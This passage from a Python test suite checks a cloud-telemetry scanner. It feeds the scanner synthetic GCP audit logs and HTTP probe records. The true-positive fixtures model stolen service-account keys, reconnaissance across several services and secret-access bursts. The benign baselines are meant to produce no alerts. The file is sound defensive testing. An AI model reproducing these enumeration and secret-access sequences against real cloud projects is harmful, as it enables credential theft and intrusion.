        resource: str = "projects/prod-proj",
        grpc_code: int | None = 0,
        status_msg: str = "",
        ua: str = "google-cloud-sdk gcloud/490.0.0",
    ) -> dict:
        pp: dict = {
            "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
            "authenticationInfo": {"principalEmail": principal},
            "requestMetadata": {"callerIp": ip, "callerSuppliedUserAgent": ua},
            "serviceName": service,
            "methodName": method,
            "resourceName": resource,
        }
        if grpc_code is not None or status_msg:
            pp["status"] = {}
            if grpc_code is not None:
                pp["status"]["code"] = grpc_code
            if status_msg:
                pp["status"]["message"] = status_msg
        return {"timestamp": ts, "protoPayload": pp, "logName": "projects/prod-proj/logs/cloudaudit.googleapis.com%2Fdata_access"}

    # 1. TP A: Bitrise-style native GCP Cloud Audit {"entries": [...]} export — single IP operating 4 distinct SAs
    #    (incl. default compute@developer SA) + sequential PERMISSION_DENIED (gRPC code 7) -> AccessSecretVersion (200 OK)
    p_gcp_tp = tmp_path / "gcp_bitrise_attack.json"
    entries_tp = [
        _gcp_entry("2026-11-23T08:00:00Z", "198.51.100.77", "ci-worker-01@prod-proj.iam.gserviceaccount.com", "storage.googleapis.com", "storage.buckets.list", grpc_code=7, status_msg="Permission 'storage.buckets.list' denied"),
        _gcp_entry("2026-11-23T08:00:02Z", "198.51.100.77", "ci-worker-01@prod-proj.iam.gserviceaccount.com", "compute.googleapis.com", "v1.compute.instances.list", grpc_code=7, status_msg="Permission 'compute.instances.list' denied"),
        _gcp_entry("2026-11-23T08:00:04Z", "198.51.100.77", "ci-worker-01@prod-proj.iam.gserviceaccount.com", "iam.googleapis.com", "google.iam.admin.v1.ListServiceAccounts", grpc_code=7, status_msg="Permission denied"),
        _gcp_entry("2026-11-23T08:00:06Z", "198.51.100.77", "ci-worker-01@prod-proj.iam.gserviceaccount.com", "secretmanager.googleapis.com", "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion", resource="projects/123/secrets/prod-signing-key/versions/latest", grpc_code=0),
        _gcp_entry("2026-11-23T08:00:30Z", "198.51.100.77", "deploy-bot-02@prod-proj.iam.gserviceaccount.com", "cloudresourcemanager.googleapis.com", "GetIamPolicy", grpc_code=7, status_msg="PERMISSION_DENIED"),
        _gcp_entry("2026-11-23T08:01:00Z", "198.51.100.77", "artifact-sync-03@prod-proj.iam.gserviceaccount.com", "artifactregistry.googleapis.com", "google.devtools.artifactregistry.v1.ArtifactRegistry.ListRepositories", grpc_code=0),
        _gcp_entry("2026-11-23T08:01:30Z", "198.51.100.77", "1234567890-compute@developer.gserviceaccount.com", "iamcredentials.googleapis.com", "GenerateAccessToken", grpc_code=0),
    ]
    p_gcp_tp.write_text(json.dumps({"entries": entries_tp}), encoding="utf-8")
    c_gcp_tp = scan_telemetry_file(p_gcp_tp)
    gcp_reasons = {r for c in c_gcp_tp for r in c.reasons}
    assert "cloud_multi_identity_from_single_ip" in gcp_reasons
    assert "cloud_secret_search_or_dryrun_burst" in gcp_reasons
    multi_cand = next(c for c in c_gcp_tp if "cloud_multi_identity_from_single_ip" in c.reasons)
    assert multi_cand.appliance == "gcp_audit"
    assert multi_cand.risk_score >= 90 and multi_cand.alert_tier == "alert"

    # 2. TP B: 100%-200 OK stolen GCP key multi-service recon across 5 services in < 20s
    p_gcp_enum = tmp_path / "gcp_stolen_key_enum.jsonl"
    enum_entries = [
        _gcp_entry("2026-11-23T08:10:00Z", "203.0.113.88", "build-runner@prod-proj.iam.gserviceaccount.com", "cloudresourcemanager.googleapis.com", "GetProject", grpc_code=0),
        _gcp_entry("2026-11-23T08:10:03Z", "203.0.113.88", "build-runner@prod-proj.iam.gserviceaccount.com", "iam.googleapis.com", "google.iam.admin.v1.ListServiceAccounts", grpc_code=0),
        _gcp_entry("2026-11-23T08:10:06Z", "203.0.113.88", "build-runner@prod-proj.iam.gserviceaccount.com", "secretmanager.googleapis.com", "google.cloud.secretmanager.v1.SecretManagerService.ListSecrets", grpc_code=0),
        _gcp_entry("2026-11-23T08:10:09Z", "203.0.113.88", "build-runner@prod-proj.iam.gserviceaccount.com", "compute.googleapis.com", "v1.compute.instances.list", grpc_code=0),
        _gcp_entry("2026-11-23T08:10:12Z", "203.0.113.88", "build-runner@prod-proj.iam.gserviceaccount.com", "storage.googleapis.com", "storage.buckets.list", grpc_code=0),
    ]
    p_gcp_enum.write_text("\n".join(json.dumps(e) for e in enum_entries) + "\n", encoding="utf-8")
    c_gcp_enum = scan_telemetry_file(p_gcp_enum)
    assert c_gcp_enum and "cloud_stolen_key_multi_service_enum" in c_gcp_enum[0].reasons

    # 3. TN (0 FP): Benign GCP Terraform SA + Google-managed service agents + corporate NAT human engineers + single routine SA
    p_gcp_ok = tmp_path / "gcp_benign_baselines.jsonl"
    ok_entries = [
        # Terraform SA provisioning across 5 services + SetIamPolicy
        _gcp_entry("2026-11-23T09:00:00Z", "198.51.100.120", "terraform-deploy@prod-proj.iam.gserviceaccount.com", "cloudresourcemanager.googleapis.com", "SetIamPolicy", grpc_code=0, ua="Terraform/1.9.8"),
        _gcp_entry("2026-11-23T09:00:02Z", "198.51.100.120", "terraform-deploy@prod-proj.iam.gserviceaccount.com", "iam.googleapis.com", "SetIamPolicy", grpc_code=0, ua="Terraform/1.9.8"),
        _gcp_entry("2026-11-23T09:00:04Z", "198.51.100.120", "terraform-deploy@prod-proj.iam.gserviceaccount.com", "secretmanager.googleapis.com", "google.cloud.secretmanager.v1.SecretManagerService.ListSecrets", grpc_code=0, ua="Terraform/1.9.8"),
        _gcp_entry("2026-11-23T09:00:06Z", "198.51.100.120", "terraform-deploy@prod-proj.iam.gserviceaccount.com", "compute.googleapis.com", "v1.compute.instances.list", grpc_code=0, ua="Terraform/1.9.8"),
        _gcp_entry("2026-11-23T09:00:08Z", "198.51.100.120", "terraform-deploy@prod-proj.iam.gserviceaccount.com", "storage.googleapis.com", "storage.buckets.list", grpc_code=0, ua="Terraform/1.9.8"),
        # Google-managed service agents sharing an IP
        _gcp_entry("2026-11-23T09:01:00Z", "198.51.100.120", "service-123456@gcp-sa-gke.iam.gserviceaccount.com", "compute.googleapis.com", "v1.compute.instances.list", grpc_code=0),
        _gcp_entry("2026-11-23T09:01:05Z", "198.51.100.120", "123456@cloudservices.gserviceaccount.com", "compute.googleapis.com", "v1.compute.instances.list", grpc_code=0),
        _gcp_entry("2026-11-23T09:01:10Z", "198.51.100.120", "gke-system@prod-proj.iam.gserviceaccount.com", "container.googleapis.com", "google.container.v1.ClusterManager.GetCluster", grpc_code=0),
        # Three human engineers behind one corporate office NAT IP running gcloud
        _gcp_entry("2026-11-23T09:05:00Z", "198.51.100.200", "alice@corp.example", "compute.googleapis.com", "v1.compute.instances.list", grpc_code=0),
        _gcp_entry("2026-11-23T09:05:10Z", "198.51.100.200", "bob@corp.example", "storage.googleapis.com", "storage.buckets.list", grpc_code=0),
        _gcp_entry("2026-11-23T09:05:20Z", "198.51.100.200", "carol@corp.example", "bigquery.googleapis.com", "jobservice.list", grpc_code=0),
        # Single routine application SA doing normal storage/compute reads + startup fetch of 2 runtime secrets
        _gcp_entry("2026-11-23T09:10:00Z", "203.0.113.15", "app-backend@prod-proj.iam.gserviceaccount.com", "storage.googleapis.com", "storage.objects.get", resource="projects/prod/buckets/arm-compute-container-iam-storage-logs/objects/app.json", grpc_code=0),
        _gcp_entry("2026-11-23T09:10:05Z", "203.0.113.15", "app-backend@prod-proj.iam.gserviceaccount.com", "secretmanager.googleapis.com", "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion", resource="projects/prod/secrets/db-password/versions/latest", grpc_code=0),
        _gcp_entry("2026-11-23T09:10:06Z", "203.0.113.15", "app-backend@prod-proj.iam.gserviceaccount.com", "secretmanager.googleapis.com", "google.cloud.secretmanager.v1.SecretManagerService.AccessSecretVersion", resource="projects/prod/secrets/stripe-key/versions/latest", grpc_code=0),
        _gcp_entry("2026-11-23T09:10:15Z", "203.0.113.15", "app-backend@prod-proj.iam.gserviceaccount.com", "compute.googleapis.com", "v1.compute.instances.get", grpc_code=0),
    ]
    p_gcp_ok.write_text("\n".join(json.dumps(e) for e in ok_entries) + "\n", encoding="utf-8")
    assert scan_telemetry_file(p_gcp_ok) == []

    # 3b. Cloud Logging {"entries": [...]} bundle with >10 leading textPayload records + stringified gRPC status codes
    p_gcp_mixed = tmp_path / "gcp_mixed_entries.json"
    leading_text = [
        {"timestamp": f"2026-11-23T09:20:{i:02d}Z", "textPayload": f"app log line {i}"}
        for i in range(12)
    ]
    trailing_audit = [
        {
            "timestamp": "2026-11-23T09:21:00Z",
            "protoPayload": {
                "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
                "authenticationInfo": {"principalEmail": "ci-worker-09@prod-proj.iam.gserviceaccount.com"},
                "requestMetadata": {"callerIp": "198.51.100.78"},
                "serviceName": "storage.googleapis.com",
                "methodName": f"storage.buckets.test_{i}",
                "status": {"code": "PERMISSION_DENIED" if i % 2 == 0 else "7"},
            },
        }
        for i in range(5)
    ]
    p_gcp_mixed.write_text(json.dumps({"entries": leading_text + trailing_audit}), encoding="utf-8")
    c_gcp_mixed = scan_telemetry_file(p_gcp_mixed)
    assert c_gcp_mixed and "cloud_secret_search_or_dryrun_burst" in c_gcp_mixed[0].reasons

    # 4. TP + TN: Bitrise ARTEX task-iteration canary probes (`/_i6084_probe_missing`, `/api/v1/i871-probe`)
    p_probe_tp = tmp_path / "bitrise_probes_tp.jsonl"
    p_probe_tp.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T10:00:00Z", "source_host": "198.51.100.91", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/_i6084_probe_missing", "status_code": 404},
                {"timestamp": "2026-11-23T10:00:05Z", "source_host": "198.51.100.92", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/api/v1/i871-probe", "status_code": 404},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    c_probe_tp = scan_telemetry_file(p_probe_tp)
    assert len(c_probe_tp) == 2
    assert all("unit42_agentic_canary_probe" in c.reasons and c.risk_score >= 80 for c in c_probe_tp)

    p_probe_ok = tmp_path / "bitrise_probes_tn.jsonl"
    p_probe_ok.write_text(
        "\n".join(
            json.dumps(r)
            for r in [
                {"timestamp": "2026-11-23T10:05:00Z", "source_host": "198.51.100.93", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/api/v1/items/123", "status_code": 200},
                {"timestamp": "2026-11-23T10:05:10Z", "source_host": "198.51.100.93", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/multi-probe", "status_code": 404},
                {"timestamp": "2026-11-23T10:05:20Z", "source_host": "198.51.100.93", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/ci-probe", "status_code": 404},
                {"timestamp": "2026-11-23T10:05:30Z", "source_host": "198.51.100.93", "event_type": "http", "surface": "web_portal", "dest_host": "app.example.test", "http_method": "GET", "http_path": "/i1-probe", "status_code": 404},
            ]
        )
        + "\n",
        encoding="utf-8",
    )
    assert scan_telemetry_file(p_probe_ok) == []







